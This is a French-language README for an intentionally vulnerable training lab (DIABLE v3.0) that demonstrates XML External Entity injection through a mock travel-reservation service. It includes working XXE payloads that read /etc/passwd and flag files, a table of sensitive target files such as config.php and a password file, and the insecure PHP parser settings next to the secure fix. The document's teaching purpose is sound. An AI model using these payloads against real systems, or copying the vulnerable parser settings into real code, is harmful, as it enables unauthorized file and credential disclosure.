# Lab DIABLE - XXE (XML External Entity)

**Version:** 1.0  
**Auteur:** Hamed  
**Tag:** XML  
**Difficulté:** Moyen

---

## 📖 Description

Ce laboratoire démontre une vulnérabilité XXE (XML External Entity) permettant de lire des fichiers sensibles sur le serveur via des entités XML externes. L'application simule un service de validation de réservations XML pour une agence de voyage.

**Scénarios disponibles :**
1. Validation XML directe (index.php)
2. Upload de fichier XML avec affichage visible (upload.php)

---

## 📂 Structure du projet

```
xxe-lab/
├── Dockerfile
├── README.md
└── src/
    ├── index.php # Validation XML directe (Scénario 1)
    ├── upload.php # Upload de fichier XML (Scénario 2)
    ├── style.css # Thème DIABLE
    ├── health.php # Health check
    └── reset.php # Reset du lab
```

---

## 🚀 Installation

### Prérequis
- Docker Desktop ou Docker Engine
- Git
- Navigateur web

### Démarrage rapide

```bash
# Cloner le projet (si ce n'est pas déjà fait)
git clone https://github.com/tsubasa1123/diable-v3.git
cd diable-v3/attacks/xxe-lab

# Construire l'image Docker
docker build -t diable/xxe-lab .

# Lancer le conteneur
docker run -d -p 8084:80 --name xxe-lab diable/xxe-lab
```

**Accéder au lab**: http://localhost:8084

#### Arrêter le conteneur
```bash
docker stop xxe-lab
docker rm xxe-lab
```

#### Voir les logs
```bash
docker logs -f xxe-lab
```

---

### 🎮 Scénario 1: Validation XML directe

Page: http://localhost:8084/index.php

**Payload pour lire /tmp/flag.txt :**
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///tmp/flag.txt">
]>
<reservation>
    <nom>&xxe;</nom>
    <vol>AF123</vol>
</reservation>
```

**Résultat attendu**: Le nom "Dupont" est remplacé par `FLAG{XXE_Success_12345}`

---

### 🎮 Scénario 2: Upload de fichier XML

Page: http://localhost:8084/upload.php

Créer un fichier XML normal (test) :
```bash
nano reservation.xml
```

```xml
<?xml version="1.0"?>
<reservation>
    <nom>Jean Dupont</nom>
    <vol>AF123</vol>
    <date>2026-03-01</date>
</reservation>
```

Créer un fichier XML malveillant :
```bash
nano xxe.xml
```

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<reservation>
    <nom>&xxe;</nom>
    <vol>AF123</vol>
    <date>2026-03-01</date>
</reservation>
```

**Upload et résultat**

- Uploader `reservation.xml` → Nom affiché: **"Jean Dupont"**
- Uploader `xxe.xml` → Nom affiché: **Contenu de /etc/passwd**

---

### 🔥 Fichiers sensibles à tester

| Fichier                         | Contenu                          | Intérêt               |
|----------------------------------|----------------------------------|-----------------------|
| `file:///tmp/flag.txt`           | `FLAG{XXE_Success_12345}`        | Test pédagogique      |
| `file:///etc/passwd`             | Liste des utilisateurs          | Énumération           |
| `file:///etc/hostname`           | Nom de la machine                | Information système   |
| `file:///var/www/html/config.php`| Configuration PHP                | Mots de passe possibles |
| `file:///tmp/config.txt`         | `DB_PASSWORD=SuperSecret123`     | Secret de test        |

---

## 💻 Code vulnérable (explication)

### Dans `index.php` :

```php
// 🔴 LIGNE DANGEREUSE : Active les entités externes
libxml_disable_entity_loader(false);

// 🔴 AUTRE LIGNE DANGEREUSE : Résout les entités
$doc->loadXML($xml_input, LIBXML_NOENT);
```

### Dans `upload.php` (même principe) :

```php
libxml_disable_entity_loader(false);
$doc->loadXML($xml_input, LIBXML_NOENT);
```

---

## 🛡️ Correction (code sécurisé)

```php
// ✅ Désactiver les entités externes
libxml_disable_entity_loader(true);

// ✅ Ne pas utiliser LIBXML_NOENT
$doc->loadXML($xml_input, LIBXML_NONET);
```

---

## 📊 Fichiers de test dans le conteneur

Ces fichiers sont créés dans `/tmp/` pour la démo :

- `/tmp/flag.txt` → `FLAG{XXE_Success_12345}`
- `/tmp/passwd` → Faux fichier `passwd`
- `/tmp/config.txt` → `DB_PASSWORD=SuperSecret123`

---

## ✅ Checklist de validation

- Scénario 1: Le flag s'affiche dans le nom
- Scénario 2: Upload de fichier XML normal fonctionne
- Scénario 2: Upload de fichier XXE lit `/etc/passwd`
- Scénario 2: Le nom volé s'affiche en GRAND et en couleur
- Health check: http://localhost:8084/health.php retourne JSON

---

## 🔧 Commandes utiles

#### Vérifier que le conteneur tourne
```bash
docker ps
```

#### Voir les fichiers dans le conteneur
```bash
docker exec -it xxe-lab ls -la /tmp/
```

#### Lire un fichier directement
```bash
docker exec -it xxe-lab cat /tmp/flag.txt
```

#### Health check
```bash
curl http://localhost:8084/health.php
```

#### Reset (réinitialiser le lab)
```bash
curl http://localhost:8084/reset.php
```

---

⚠️ **Avertissement**  
Ce laboratoire contient des vulnérabilités intentionnelles à des fins pédagogiques dans le cadre du projet DIABLE v3.0 (DSI ISFA 2025-2026). Ne JAMAIS déployer en production ou sur des systèmes réels sans autorisation.

---

✍️ **Auteur**  
Hamed  
DSI ISFA 2025-2026  

📅 **Historique**

| Version | Date       | Auteur | Modifications                    |
|---------|------------|--------|-----------------------------------|
| 1.0     | 01/03/2026 | Hamed  | Version initiale - 2 scénarios    |
